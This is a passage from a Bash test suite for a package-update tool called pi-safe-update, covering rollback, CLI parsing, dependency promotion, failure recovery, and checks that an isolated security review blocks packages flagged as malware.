  # Our test hashes are deterministic ("test-<dir>-hash"), so the comparison works.

  local out2
  out2=$(run_safe_update "" "rollback" "test-pkg")
  if output_contains "$out2" "rollback.*complete" || output_contains "$out2" "complete"; then
    pass "rollback completed"
  else
    fail "rollback should complete"
    echo "    Output: $(echo "$out2" | head -20)"
  fi

  teardown_test
}

# ── Rollback without prior update ──────────────────────────────────────────
test_rollback_failure_recovers_current_trees() {
  setup_test
  local out journal
  out=$(run_safe_update '' update test-pkg)
  if ! output_contains "$out" "Promotion: complete"; then
    fail "precondition: update must succeed for rollback fault test"
    teardown_test
    return
  fi
  out=$(run_safe_update "export FAIL_MV_ONCE=1 FAIL_MV_DEST='$FAKE_PI_DIR/node_modules/test-pkg' FAIL_MV_MARKER='$TEST_TEMP/rollback-mv.failed'" rollback test-pkg)
  journal=$(find "$LOCK_DIR/runs" -name transaction.json -type f | head -1)
  if output_contains "$out" "MANUAL_RECOVERY_REQUIRED" \
    && [ "$(node -p "require('$FAKE_PI_DIR/node_modules/test-pkg/package.json').version")" = "2.0.0" ] \
    && [ "$(node -p "require('$journal').state")" = "rollback-recovered" ]; then
    pass "rollback failure restores the current package and preserves recovery state"
  else
    fail "rollback failure must recover the current transaction"
    echo "    Output: $(echo "$out" | tail -12)"
  fi
  teardown_test
}

test_rollback_no_journal() {
  setup_test

  local out
  out=$(run_safe_update "" "rollback" "test-pkg")
  if output_contains "$out" "no.*journal" || output_contains "$out" "no.*committed"; then
    pass "rollback without journal rejected"
  else
    fail "rollback without journal should be rejected"
    echo "    Output: $(echo "$out" | head -10)"
  fi
  teardown_test
}

# ── Rollback unknown package ───────────────────────────────────────────────
test_rollback_unknown_package() {
  setup_test

  local out
  out=$(run_safe_update "" "rollback" "nonexistent")
  if output_contains "$out" "no.*journal" || output_contains "$out" "no.*committed"; then
    pass "rollback unknown package rejected"
  else
    # Might also show "not found" depending on code path
    if output_contains "$out" "FATAL"; then
      pass "rollback unknown package yields fatal (acceptable)"
    else
      fail "rollback of unknown package should be rejected"
      echo "    Output: $(echo "$out" | head -10)"
    fi
  fi
  teardown_test
}

# ── CLI rejects duplicate flags ────────────────────────────────────────────
test_update_duplicate_flags() {
  setup_test
  local out
  out=$(run_safe_update "" "update" "test-pkg" "--to" "2.0.0" "--to" "3.0.0")
  if output_contains "$out" "multiple.*--to"; then
    pass "duplicate --to rejected"
  else
    fail "duplicate --to should be rejected"
    echo "    Output: $(echo "$out" | head -10)"
  fi
  teardown_test
}

# ── Scoped package (@scope/name) ───────────────────────────────────────────
test_update_scoped_package() {
  setup_test
  # Set up a scoped package
  mkdir -p "$FAKE_PI_DIR/node_modules/@scope/mypkg"
  echo '{"name":"@scope/mypkg","version":"1.0.0"}' > "$FAKE_PI_DIR/node_modules/@scope/mypkg/package.json"
  echo "index.js" > "$FAKE_PI_DIR/node_modules/@scope/mypkg/index.js"
  cat > "$FAKE_PI_DIR/settings.json" <<'EOF'
{
  "packages": ["@scope/mypkg@1.0.0"]
}
EOF

  local out
  out=$(run_safe_update "" "update" "@scope/mypkg")
  if output_contains "$out" "promot" && output_contains "$out" "PASS"; then
    pass "scoped package update promoted"
  else
    if output_contains "$out" "FATAL"; then
      fail "scoped package caused fatal: $(echo "$out" | tail -5)"
    else
      fail "scoped package should promote"
    fi
  fi
  teardown_test
}

# ── Multiple packages, update one ──────────────────────────────────────────
test_update_pi_npm_layout_and_prefix() {
  setup_test
  mkdir -p "$FAKE_PI_DIR/npm"
  mv "$FAKE_PI_DIR/node_modules" "$FAKE_PI_DIR/npm/node_modules"
  local out
  out=$(run_safe_update "" "update" "npm:test-pkg")
  if output_contains "$out" "promot" && [ -f "$FAKE_PI_DIR/npm/node_modules/test-pkg/package.json" ]; then
    pass "npm: package source uses Pi npm/node_modules layout"
  else
    fail "npm: package source and Pi npm/node_modules layout should work"
    echo "    Output: $(echo "$out" | tail -10)"
  fi
  teardown_test
}

test_update_multiple_packages() {
  setup_test
  # Set up multiple packages
  mkdir -p "$FAKE_PI_DIR/node_modules/other-pkg"
  echo '{"name":"other-pkg","version":"1.0.0"}' > "$FAKE_PI_DIR/node_modules/other-pkg/package.json"
  cat > "$FAKE_PI_DIR/settings.json" <<'EOF'
{
  "packages": ["test-pkg@1.0.0", "other-pkg@1.0.0"]
}
EOF

  local out
  out=$(run_safe_update "" "update" "test-pkg")
  if output_contains "$out" "promot"; then
    pass "update one of multiple packages promoted"
    # Verify other-pkg unchanged
    local other_ver
    other_ver=$(python3 -c "import json; print(json.load(open('$FAKE_PI_DIR/node_modules/other-pkg/package.json')).get('version',''))" 2>/dev/null || echo "")
    if [ "$other_ver" = "1.0.0" ]; then
      pass "  other package unchanged"
    else
      fail "  other package should remain at 1.0.0, got $other_ver"
    fi
  else
    fail "multiple packages update should promote"
    echo "    Output: $(echo "$out" | head -10)"
  fi
  teardown_test
}

test_security_review_uses_bounded_inventory() {
  setup_test
  printf '%s\n' 'UNIQUE_REVIEW_CONTENT_MUST_NOT_BE_EMBEDDED' > "$FAKE_PI_DIR/node_modules/test-pkg/large-source.ts"
  run_safe_update "" "update" "test-pkg" > /dev/null 2>&1 || true
  local run_dir prompt
  run_dir=$(find "$LOCK_DIR/runs" -mindepth 1 -maxdepth 1 -type d | head -1)
  prompt="$run_dir/artifacts/security-prompt.txt"
  if [ -f "$prompt" ] \
    && grep -q 'ISOLATED CANDIDATE ROOT' "$prompt" \
    && grep -q 'FILE INVENTORY' "$prompt" \
    && ! grep -q 'UNIQUE_REVIEW_CONTENT_MUST_NOT_BE_EMBEDDED' "$prompt" \
    && [ -f "$run_dir/review-target/package/large-source.ts" ] \
    && assert_invocation_contains 'pi.*--print' \
    && ! grep -q 'pi.*--mode json' "$INVOCATIONS_LOG"; then
    pass "security review receives an isolated source copy and bounded inventory"
  else
    fail "security review must not embed the full untrusted diff"
  fi
  teardown_test
}

test_policy_checks_are_reviewed_not_suppressed() {
  if grep -Fq 'Lifecycle scripts found:' "$PI_SAFE_UPDATE_WORKFLOW" \
    && grep -Fq 'Non-registry dependency source (review)' "$PI_SAFE_UPDATE_WORKFLOW" \
    && grep -Fq 'dependency-changes.log' "$PI_SAFE_UPDATE_WORKFLOW" \
    && grep -Fq 'stable relative-path tree hash' "$PROJECT_DIR/pi_safe_update/transaction.py" \
    && grep -Fq 'confirmed malware/backdoor' "$PI_SAFE_UPDATE_WORKFLOW"; then
    pass "lifecycle/dependency findings require candidate-specific review"
  else
    fail "lifecycle/dependency findings must be reviewed, not silently suppressed"
  fi
}

test_extension_smoke_artifacts() {
  setup_test
  local out
  out=$(run_safe_update "" "update" "test-pkg")
  local run_dir
  run_dir=$(find "$LOCK_DIR/runs" -mindepth 1 -maxdepth 1 -type d | head -1)
  if output_contains "$out" "smoke test: PASS" \
    && [ -f "$run_dir/artifacts/sandbox-baseline.json" ] \
    && [ -f "$run_dir/artifacts/sandbox-smoke.json" ] \
    && assert_invocation_contains --mode; then
    pass "extension smoke test launches Pi and records artifacts"
  else
    fail "extension smoke test should pass and record artifacts"
    echo "    Output: $(echo "$out" | tail -20)"
  fi
  teardown_test
}

test_lifecycle_review_pass_fail_and_malformed() {
  setup_test
  local out run_dir
  out=$(run_safe_update 'export FAKE_LIFECYCLE_SCRIPT=1' update test-pkg)
  run_dir=$(find "$LOCK_DIR/runs" -mindepth 1 -maxdepth 1 -type d | head -1)
  if output_contains "$out" "Promotion: complete" && grep -q prepare "$run_dir/artifacts/lifecycle-scripts.txt"; then
    pass "lifecycle script evidence is retained and PASS promotes"
  else
    fail "reviewed-safe lifecycle script should promote with evidence"
  fi
  teardown_test

  setup_test
  out=$(run_safe_update 'export FAKE_LIFECYCLE_SCRIPT=1 REVIEW_VERDICT=FAIL' update test-pkg)
  if output_contains "$out" "malware/backdoor" && [ "$(node -p "require('$FAKE_PI_DIR/node_modules/test-pkg/package.json').version")" = "1.0.0" ]; then
    pass "lifecycle review confirmed malware remains blocked"
  else
    fail "lifecycle review confirmed malware must block"
  fi
  teardown_test

  setup_test
  out=$(run_safe_update 'export FAKE_LIFECYCLE_SCRIPT=1 REVIEW_VERDICT=MALFORMED' update test-pkg)
  if output_contains "$out" "UNVERIFIED" && output_contains "$out" "Promotion: complete"; then
    pass "malformed lifecycle review is non-blocking UNVERIFIED evidence"
  else
    fail "malformed lifecycle review should not become a malware verdict"
  fi
  teardown_test
}

test_dependency_tree_promotion() {
  setup_test
  mkdir -p "$FAKE_PI_DIR/node_modules/test-dep"
  printf '{"name":"test-dep","version":"1.0.0"}\n' > "$FAKE_PI_DIR/node_modules/test-dep/package.json"
  printf 'dependency v1\n' > "$FAKE_PI_DIR/node_modules/test-dep/index.js"
  local out
  out=$(run_safe_update 'export FAKE_DEPENDENCY_CHANGE=1' update test-pkg)
  if output_contains "$out" "Promotion: complete" \
    && [ "$(node -p "require('$FAKE_PI_DIR/node_modules/test-dep/package.json').version")" = "2.0.0" ] \
    && grep -q test-dep "$LOCK_DIR/runs"/*/artifacts/promotion-trees.txt; then
    pass "reviewed dependency tree is promoted"
  else
    fail "reviewed dependency tree should be promoted"
  fi
  teardown_test
}

test_dependency_deletion_and_unrelated_change_policy() {
  setup_test
  mkdir -p "$FAKE_PI_DIR/node_modules/test-dep"
  printf '{"name":"test-dep","version":"1.0.0"}\n' > "$FAKE_PI_DIR/node_modules/test-dep/package.json"
  local out
  out=$(run_safe_update 'export FAKE_DEPENDENCY_DELETE=1' update test-pkg)
  if output_contains "$out" "Promotion: complete"; then
    pass "dependency deletion evidence is recorded for transactional handling"
  else
    fail "dependency deletion should be handled transactionally"
  fi
  if [ ! -e "$FAKE_PI_DIR/node_modules/test-dep" ]; then
    pass "reviewed dependency deletion is promoted"
  else
    fail "reviewed dependency deletion should remove the dependency tree"
  fi
  teardown_test

  setup_test
  out=$(run_safe_update 'export FAKE_UNRELATED_CHANGE=1' update test-pkg)
  if output_contains "$out" "Unexpected changes outside selected package" \
    && [ "$(node -p "require('$FAKE_PI_DIR/node_modules/test-pkg/package.json').version")" = "1.0.0" ]; then
    pass "unrelated root changes remain blocked"
  else
    fail "unrelated root changes must remain blocked"
  fi
  teardown_test
}

# ═════════════════════════════════════════════════════════════════════════════
# RUN ALL TESTS
# ═════════════════════════════════════════════════════════════════════════════

echo "pi-safe-update test suite"
echo "Script: $PI_SAFE_UPDATE"
echo ""

header "CLI Parsing"
test_help
test_help_flag
test_no_args
test_unknown_command
test_update_no_source
test_update_unknown_flag

header "Preflight Validation"
test_update_package_not_found
test_update_object_form_package
test_update_missing_settings
test_update_github_invalid_sha

header "Update Paths"
test_update_happy_path
test_update_with_target
test_update_github_source_valid
test_update_duplicate_flags
test_update_scoped_package
test_update_pi_npm_layout_and_prefix
test_update_multiple_packages

header "Security Isolation"
test_pi_called_with_security_flags
test_lock_held
test_security_review_uses_bounded_inventory
test_policy_checks_are_reviewed_not_suppressed
test_lifecycle_review_pass_fail_and_malformed
test_confirmed_malware_fixture_blocks
test_review_can_resolve_benign_finding
test_dependency_tree_promotion
test_dependency_deletion_and_unrelated_change_policy
test_extension_smoke_artifacts

header "Batch Updates"
test_update_all_promotes_outdated_npm_package
test_update_all_skips_current_and_pinned_packages
test_update_all_ignores_stale_transaction_artifacts

header "Promotion failure cleanup"
test_promotion_failure_recovers_all_trees
test_promotion_copy_failure_recovers_all_trees
test_promotion_settings_failure_recovers_all_trees

# ── Summary ────────────────────────────────────────────────────────────────
echo ""
echo "═══════════════════════════════════════════════════════════════════"
echo "  Tests run: $TESTS_RUN  |  Passed: $PASS  |  Failed: $FAIL"
echo "═══════════════════════════════════════════════════════════════════"

[ $FAIL -eq 0 ] && exit 0 || exit 1
